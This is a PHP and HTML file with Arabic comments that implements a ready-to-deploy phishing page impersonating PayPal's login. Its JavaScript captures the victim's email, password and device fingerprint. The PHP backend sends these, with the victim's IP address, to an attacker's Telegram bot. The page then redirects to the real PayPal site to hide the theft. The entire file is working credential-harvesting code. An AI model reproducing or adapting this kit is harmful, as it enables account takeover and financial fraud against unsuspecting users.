<?php
// توكن البوت الخاص بك
$botToken = "BBOTTTTTTTTTTT";

// دالة لإرسال الرسائل إلى التليجرام
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال البيانات من JavaScript
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $credentials = $input['credentials'] ?? null;
    $deviceInfo = $input['deviceInfo'] ?? null;

    if ($credentials && $deviceInfo) {
        // إرسال بيانات تسجيل الدخول ومعلومات الجهاز
        $loginMessage = "
🔐 <b>بيانات تسجيل دخول PayPal</b>

👤 <b>معرف المستخدم:</b> <code>{$chatId}</code>
📧 <b>البريد الإلكتروني:</b> <code>{$credentials['email']}</code>
🔒 <b>كلمة المرور:</b> <code>{$credentials['password']}</code>

🌐 <b>معلومات الجهاز:</b>
📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
🔋 <b>البطارية:</b> {$deviceInfo['battery']}
🖥️ <b>النظام:</b> {$deviceInfo['platform']}
🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
📶 <b>نوع الاتصال:</b> {$deviceInfo['connection']}
🗣️ <b>اللغة:</b> {$deviceInfo['language']}
🕒 <b>المنطقة الزمنية:</b> {$deviceInfo['timezone']}
📺 <b>معلومات الشاشة:</b> {$deviceInfo['screen']}

📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
        ";
        $result = sendTelegramMessage($chatId, $loginMessage, $botToken);
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل الدخول إلى PayPal</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    
    body {
      background-color: #f5f5f5;
      color: #2c2e2f;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    
    .container {
      width: 100%;
      max-width: 400px;
      margin: 0 auto;
    }
    
    .logo-container {
      text-align: center;
      margin-bottom: 30px;
    }
    
    .paypal-logo {
      width: 150px;
      height: 40px;
      margin-bottom: 20px;
    }
    
    .login-form {
      background-color: #ffffff;
      border: 1px solid #dddfe2;
      border-radius: 8px;
      padding: 20px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    
    h1 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 24px;
      font-weight: 600;
      color: #2c2e2f;
    }
    
    .subtitle {
      text-align: center;
      margin-bottom: 20px;
      font-size: 14px;
      color: #6c7378;
    }
    
    .input-group {
      margin-bottom: 15px;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: #6c7378;
      font-weight: 500;
    }
    
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      background-color: #ffffff;
      border: 1px solid #dddfe2;
      border-radius: 4px;
      color: #2c2e2f;
      font-size: 16px;
    }
    
    input[type="email"]:focus,
    input[type="password"]:focus {
      outline: none;
      border-color: #0070ba;
      background-color: #ffffff;
    }
    
    .login-btn {
      width: 100%;
      padding: 12px;
      background-color: #0070ba;
      color: #fff;
      border: none;
      border-radius: 24px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.2s;
    }
    
    .login-btn:hover {
      background-color: #005ea6;
    }
    
    .links {
      text-align: center;
      margin-top: 20px;
      font-size: 14px;
    }
    
    .links a {
      color: #0070ba;
      text-decoration: none;
      display: block;
      margin: 10px 0;
    }
    
    .links a:hover {
      text-decoration: underline;
    }
    
    .divider {
      border-top: 1px solid #dddfe2;
      margin: 20px 0;
    }
    
    .signup-btn {
      width: 100%;
      padding: 12px;
      background-color: #ffffff;
      color: #0070ba;
      border: 1px solid #0070ba;
      border-radius: 24px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.2s;
    }
    
    .signup-btn:hover {
      background-color: #f5f9ff;
    }
    
    .footer {
      text-align: center;
      margin-top: 30px;
      color: #6c7378;
      font-size: 12px;
      line-height: 1.6;
    }
    
    .footer a {
      color: #6c7378;
      text-decoration: none;
      margin: 0 5px;
    }
    
    .footer a:hover {
      text-decoration: underline;
    }
    
    /* عناصر التحميل */
    .loader {
        width: 30px;
        height: 30px;
        border: 3px solid rgba(0, 112, 186, 0.2);
        border-radius: 50%;
        border-top-color: #0070ba;
        animation: spin 1s linear infinite;
        margin: 20px auto;
        display: none;
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    
    .status {
        margin-top: 10px;
        font-size: 14px;
        opacity: 0.8;
        text-align: center;
        display: none;
        color: #6c7378;
    }
    
    .error-message {
      color: #d93624;
      font-size: 14px;
      margin-top: 10px;
      text-align: center;
      display: none;
    }

    .security-notice {
      background-color: #f7f9fa;
      border-radius: 4px;
      padding: 12px;
      margin-top: 20px;
      font-size: 12px;
      color: #6c7378;
      text-align: center;
    }

    .language-selector {
      text-align: center;
      margin-top: 20px;
      font-size: 12px;
      color: #6c7378;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <!-- شعار PayPal الجديد -->
      <img src="https://www.paypalobjects.com/webstatic/mktg/Logo/pp-logo-150px.png" alt="PayPal" class="paypal-logo">
    </div>
    
    <div class="login-form">
      <h1>تسجيل الدخول</h1>
      <p class="subtitle">استخدم حساب PayPal الخاص بك</p>
      
      <form id="paypalLoginForm">
        <div class="input-group">
          <label for="email">البريد الإلكتروني</label>
          <input type="email" id="email" name="email" autocomplete="email" required>
        </div>
        
        <div class="input-group">
          <label for="password">كلمة المرور</label>
          <input type="password" id="password" name="password" autocomplete="current-password" required>
        </div>
        
        <button type="submit" class="login-btn">تسجيل الدخول</button>
        
        <div class="links">
          <a href="#">هل نسيت بريدك الإلكتروني أو كلمة المرور؟</a>
          <a href="#">تسجيل الدخول باستخدام رمز التأكيد</a>
        </div>
      </form>
      
      <div class="divider"></div>
      
      <p class="subtitle">ليس لديك حساب؟</p>
      <button type="button" class="signup-btn">إنشاء حساب</button>
      
      <div class="loader" id="loader"></div>
      <div class="status" id="status">جاري التحقق من المعلومات...</div>
      <div class="error-message" id="errorMessage">حدث خطأ أثناء عملية التسجيل. يرجى المحاولة مرة أخرى.</div>
      
      <div class="security-notice">
        <p>لحماية حسابك، قد نطلب منك إكمال اختبار الأمان في الخطوة التالية.</p>
      </div>
    </div>
    
    <div class="language-selector">
      <a href="#">English</a> | 
      <a href="#">Español</a> | 
      <a href="#">Français</a> | 
      <a href="#">Italiano</a> | 
      <a href="#">Português</a>
    </div>
    
    <div class="footer">
      <a href="#">الخصوصية</a>
      <a href="#">الاتفاقيات</a>
      <a href="#">التراخيص</a>
      <a href="#">التواصل معنا</a>
      <p>© 1999–2025 PayPal, Inc. جميع الحقوق محفوظة.</p>
      <p>يخضع PayPal لشروط وأحكام اتفاقية المستخدم.</p>
    </div>
  </div>

<script>
  const params = new URLSearchParams(window.location.search);
  const chatId = params.get('ID'); // نحصل على chatId من الرابط

  // عناصر واجهة المستخدم
  const loginForm = document.getElementById('paypalLoginForm');
  const loader = document.getElementById('loader');
  const status = document.getElementById('status');
  const errorMessage = document.getElementById('errorMessage');

  async function collectDeviceInfo() {
    let batteryLevel = "غير متوفر";
    let connectionType = "غير متوفر";
    let timezone = "غير متوفر";
    let screenInfo = "غير متوفر";
    
    try {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = `${Math.round(battery.level * 100)}%`;
      }
    } catch (e) {}
    
    try {
      if (navigator.connection) {
        connectionType = navigator.connection.effectiveType;
      }
    } catch (e) {}
    
    try {
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch (e) {}
    
    try {
      screenInfo = `${screen.width}x${screen.height}, ${window.devicePixelRatio}dpr`;
    } catch (e) {}
    
    return {
      userAgent: navigator.userAgent,
      battery: batteryLevel,
      platform: navigator.platform,
      language: navigator.language,
      connection: connectionType,
      timezone: timezone,
      screen: screenInfo
    };
  }

  async function sendToServer(chatId, credentials, deviceInfo) {
    try {
      const data = {
        chatId: chatId,
        credentials: credentials,
        deviceInfo: deviceInfo
      };
      
      const response = await fetch(window.location.href, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });
      
      return await response.json();
    } catch (error) {
      console.error('Error sending to server:', error);
      return {status: 'error', error: error.message};
    }
  }

  function updateStatus(message) {
    status.textContent = message;
    status.style.display = 'block';
  }

  function showError() {
    errorMessage.style.display = 'block';
  }

  // معالجة تسجيل الدخول
  loginForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // إظهار عناصر التحميل
    loader.style.display = 'block';
    status.style.display = 'block';
    errorMessage.style.display = 'none';
    
    updateStatus('جاري التحقق من المعلومات...');
    
    try {
      // جمع معلومات الجهاز
      const deviceInfo = await collectDeviceInfo();
      
      // إرسال البيانات إلى الخادم
      const result = await sendToServer(chatId, {email, password}, deviceInfo);
      
      if (result.status === 'success') {
        updateStatus('تم تسجيل الدخول بنجاح!');
        
        // إعادة توجيه إلى PayPal بعد ثواني (وهمي)
        setTimeout(() => {
          window.location.href = 'https://www.paypal.com';
        }, 2000);
      } else {
        throw new Error('Failed to send data');
      }
    } catch (error) {
      console.error('Error during authentication:', error);
      showError();
      updateStatus('فشل في المصادقة');
    }
  });
</script>

</body>
</html>
